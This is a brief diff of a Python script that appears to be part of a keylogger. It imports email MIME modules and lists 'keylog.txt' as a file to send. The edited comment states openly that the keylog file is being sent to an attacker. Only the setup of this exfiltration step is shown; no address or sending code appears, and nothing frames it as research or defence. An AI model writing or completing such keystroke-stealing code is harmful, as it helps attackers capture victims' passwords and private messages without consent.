@@ -6,7 +6,7 @@ from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 from email.mime.base import MIMEBase
 
-# malicious script being sent to victim
+# keylog file being sent to attacker
 files_to_send = [
     "keylog.txt",
 ]
